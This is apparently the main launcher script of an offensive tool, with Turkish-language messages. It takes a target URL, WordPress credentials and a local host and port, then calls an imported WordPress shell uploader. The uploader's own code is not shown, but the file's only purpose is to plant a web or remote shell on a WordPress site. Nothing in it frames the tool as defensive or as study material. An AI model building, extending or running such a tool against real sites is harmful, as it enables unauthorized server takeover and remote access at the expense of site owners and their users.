from plugins.wordpress import wordpress_shell_uploader
from core.banner import print_banner
from core.parse_args import ArgumentParser
from core.colors import Colors

def main_function():
    args = ArgumentParser()

    if args.plugin.lower() == "wordpress":
        wordpress_shell_uploader(args.target_url, args.local_host, args.local_port, args.username, args.password)
    else:
        print(f"{Colors.red}[!]{Colors.white} Geçersiz plugin seçildi.")

if __name__ == "__main__":
    try:
        print_banner()
        main_function()
    except KeyboardInterrupt:
        print("CTRL + C kombinasyonu ile programdan çıkış yapıldı.")